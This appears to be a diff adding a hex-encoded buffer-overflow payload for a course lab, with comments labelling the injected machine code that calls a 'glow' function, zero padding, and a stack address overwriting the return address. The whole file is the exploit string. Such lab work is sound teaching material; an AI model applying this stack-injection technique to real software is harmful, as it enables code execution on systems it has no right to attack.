@@ -1,0 +1,8 @@
+/* dummy zeros */
+00 00 00 00 00 00
+/* assembly code to get into glow function,written in a .s file */
+bf 0e 66 21 5d 68 94 16 40 00 c3
+/* buffer for stack, fills the rest of the stack with dummy zeros */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* address on the stack where our assembly code is, jumps to that address (overwritese return address) */
+9e 92 60 55 00 
